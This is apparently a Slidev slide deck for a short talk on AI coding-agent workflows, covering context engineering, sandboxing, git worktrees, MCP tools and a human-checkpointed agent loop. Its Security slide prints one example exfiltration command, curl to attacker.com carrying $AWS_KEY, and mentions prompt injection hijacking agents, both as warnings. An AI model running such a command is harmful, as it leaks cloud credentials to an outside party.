---
theme: none
title: ai-data-dump
class: text-center
transition: fade
mdc: true
duration: 8min
---

<style>
:root {
  --brutalist-shadow: 5px 5px 0px #000;
  --brutalist-border: 3px solid #000;
}

.slidev-layout {
  font-family: 'JetBrains Mono', 'SF Mono', 'Fira Code', monospace;
}

h1 {
  font-weight: 900 !important;
  text-transform: uppercase;
  letter-spacing: -2px;
}

h2 {
  font-weight: 800 !important;
}

.brutal-box {
  border: var(--brutalist-border);
  box-shadow: var(--brutalist-shadow);
  padding: 1rem;
  background: #fff;
}

.brutal-card {
  border: 3px solid #000;
  box-shadow: 5px 5px 0px #000;
  padding: 1.5rem;
}

code {
  border: 2px solid #000 !important;
  box-shadow: 3px 3px 0px #000;
}

pre {
  border: 3px solid #000 !important;
  box-shadow: 5px 5px 0px #000 !important;
  border-radius: 0 !important;
}
</style>

---
layout: center
class: text-center
---

<div class="h-full w-full absolute inset-0" style="background: #FFBE0B;"></div>

<div class="relative z-10">

# ai-data-dump

<div class="brutal-box inline-block mt-8" style="background: #fff;">
<span class="text-2xl font-black">"Think of LLMs as a calculator for words"</span>
</div>

<div class="text-xl font-bold mt-6 text-black">
— Simon Willison
</div>

</div>

<!--
Set the mental model. Just like calculators changed math education
(you still need to understand math, but the tedious computation is handled),
LLMs change coding (you still need to understand code, but generation is handled).
They are stateless - no memory between calls.
-->

---

<div class="h-full w-full absolute inset-0" style="background: #FF6B6B;"></div>

<div class="relative z-10">

# ERPI Workflow

<div class="grid grid-cols-2 gap-6 mt-8">
<div class="brutal-card" style="background: #FFBE0B;">
<span class="text-2xl font-black">E</span>
<p class="font-bold mt-2">Epic — Define the problem clearly, avoid ambiguity</p>
</div>
<div class="brutal-card" style="background: #3A86FF;">
<span class="text-2xl font-black">R</span>
<p class="font-bold mt-2">Research — Explore codebase, understand patterns</p>
</div>
<div class="brutal-card" style="background: #8338EC; color: #fff;">
<span class="text-2xl font-black">P</span>
<p class="font-bold mt-2">Plan — Design before implementation</p>
</div>
<div class="brutal-card" style="background: #06D6A0;">
<span class="text-2xl font-black">I</span>
<p class="font-bold mt-2">Implement — Execute with agent assistance</p>
</div>
</div>

</div>

<!--
This is the workflow. Each phase has different tool usage.
Research phase is critical - agent reads code, you direct where to look.
Plan phase produces a detailed implementation plan - this is where you review.
Implement phase is mostly agent-driven with human checkpoints.
One-shotting leads to slop.
-->

---

<div class="h-full w-full absolute inset-0" style="background: #3A86FF;"></div>

<div class="relative z-10">

# Context Engineering

<div class="grid grid-cols-2 gap-8 mt-6">
<div>
<div class="brutal-card" style="background: #FFBE0B;">
<h2 class="text-xl font-black mb-4">Context is everything.</h2>
<ul class="text-left font-bold space-y-2">
<li>200K token window ≠ infinite</li>
<li>Aim for 40-50% max usage</li>
<li>Layered CLAUDE.md files</li>
<li>/context to visualize</li>
<li>/clear to reset</li>
</ul>
</div>
</div>
<div>
<div class="brutal-card" style="background: #fff;">

```
project/
  CLAUDE.md           # Global rules
  src/
    CLAUDE.md         # Frontend patterns
    api/
      CLAUDE.md       # API conventions
```

</div>
</div>
</div>

</div>

<!--
Think of context window as RAM. You're the memory manager.
CLAUDE.md files are like .editorconfig but for AI. They persist knowledge
across sessions. Layer them by directory for context-specific rules.
Stale memory files are your biggest enemy when trying to be productive.
-->

---

<div class="h-full w-full absolute inset-0" style="background: #8338EC;"></div>

<div class="relative z-10 text-white">

# Security

<div class="grid grid-cols-2 gap-6 mt-8">
<div class="brutal-card" style="background: #FF6B6B; color: #000;">
<span class="text-xl font-black">Sandboxing</span>
<p class="font-bold mt-2">Agents run in isolated environments</p>
</div>
<div class="brutal-card" style="background: #FFBE0B; color: #000;">
<span class="text-xl font-black">Prompt Injection</span>
<p class="font-bold mt-2">Untrusted input can hijack agents</p>
</div>
<div class="brutal-card" style="background: #06D6A0; color: #000;">
<span class="text-xl font-black">Network Access</span>
<p class="font-mono font-bold mt-2 text-sm">curl attacker.com?secret=$AWS_KEY</p>
</div>
<div class="brutal-card" style="background: #fff; color: #000;">
<span class="text-xl font-black">Code Review</span>
<p class="font-bold mt-2">Treat AI code like junior dev code</p>
</div>
</div>

</div>

<!--
Brief but important. Prompt injection is the XSS of AI.
If your agent processes user input, that input could contain instructions.
Sandboxing prevents damage from hallucinated shell commands.
The dev machine is an attack surface - a lot of code will move off personal machines.
-->

---

<div class="h-full w-full absolute inset-0" style="background: #06D6A0;"></div>

<div class="relative z-10">

# Git Worktrees

<div class="brutal-card mt-6" style="background: #000; color: #06D6A0;">

```bash
git worktree add ../project-feature-a feature-a
git worktree add ../project-feature-b feature-b
```

</div>

<div class="grid grid-cols-2 gap-4 mt-6">
<div class="brutal-card" style="background: #FFBE0B;">
<span class="font-black">Each agent gets its own directory</span>
</div>
<div class="brutal-card" style="background: #FF6B6B;">
<span class="font-black">Same repo, different branches</span>
</div>
<div class="brutal-card" style="background: #3A86FF;">
<span class="font-black">No merge conflicts between agents</span>
</div>
<div class="brutal-card" style="background: #8338EC; color: #fff;">
<span class="font-black">git worktree list to manage</span>
</div>
</div>

</div>

<!--
This is the secret sauce for multi-agent workflows.
Each agent works in isolation. You orchestrate. When done, standard PR flow.
Parallelism without the pain.
-->

---

<div class="h-full w-full absolute inset-0" style="background: #FFBE0B;"></div>

<div class="relative z-10">

# Tooling

<div class="grid grid-cols-2 gap-6 mt-8">
<div class="brutal-card" style="background: #fff;">
<h2 class="text-xl font-black mb-4 border-b-3 border-black pb-2">Documentation</h2>
<ul class="font-bold space-y-2">
<li><span class="bg-#3A86FF px-2 py-1 text-white">Context7</span> — up-to-date docs</li>
<li><span class="bg-#8338EC px-2 py-1 text-white">WebMCP</span> — fetch any URL</li>
</ul>
</div>
<div class="brutal-card" style="background: #fff;">
<h2 class="text-xl font-black mb-4 border-b-3 border-black pb-2">Development</h2>
<ul class="font-bold space-y-2">
<li><span class="bg-#FF6B6B px-2 py-1">Playwright MCP</span> — browser automation</li>
<li><span class="bg-#06D6A0 px-2 py-1">FigmaMCP</span> — design specs</li>
<li><span class="bg-#FFBE0B px-2 py-1 border-2 border-black">GitHub CLI</span> — issues, PRs</li>
</ul>
</div>
</div>

</div>

<!--
MCP is Model Context Protocol. Standardizes how LLMs connect to external tools.
These are the ones I use daily. Context7 is a game-changer for avoiding
outdated documentation hallucinations.
MCPs can bloat context - sometimes custom project scripts are better.
-->

---

<div class="h-full w-full absolute inset-0" style="background: #FF6B6B;"></div>

<div class="relative z-10">

# The Agent Control Loop

<div class="brutal-card" style="background: #000; color: #06D6A0;">

```python
while task_incomplete:
    observation = perceive(environment)
    thought = reason(observation, context)
    action = decide(thought, available_tools)
    result = execute(action)
    context.update(result)

    if human_checkpoint_needed(action):
        await human_approval()
```

</div>

<div class="brutal-box mt-6 inline-block" style="background: #FFBE0B;">
<span class="font-black text-xl">"I'm in danger"</span> — validate before destructive operations
</div>

</div>

<!--
Ralph Wiggum meme reference. The agent is the kid on the bus saying "I'm helping!"
You need checkpoints for git push, file deletion, etc.
This pseudo code represents the actual control flow of most coding agents.
-->

---
layout: center
class: text-center
---

<div class="h-full w-full absolute inset-0" style="background: #3A86FF;"></div>

<div class="relative z-10">

# Resources

<div class="grid grid-cols-1 gap-4 mt-8 max-w-md mx-auto">
<div class="brutal-card text-left" style="background: #FFBE0B;">
<span class="font-black">Simon Willison's Blog</span>
<p class="font-mono">simonwillison.net</p>
</div>
<div class="brutal-card text-left" style="background: #FF6B6B;">
<span class="font-black">Claude Code</span>
<p class="font-mono">claude.ai/code</p>
</div>
<div class="brutal-card text-left" style="background: #06D6A0;">
<span class="font-black">MCP Spec</span>
<p class="font-mono">modelcontextprotocol.io</p>
</div>
</div>

<div class="brutal-box mt-12 inline-block" style="background: #8338EC; color: #fff;">
<span class="font-black text-2xl">Live demo follows</span>
</div>

</div>

<!--
Keep this up during Q&A. Blog post has more detail.
Transition to live demo of the actual workflow.
-->
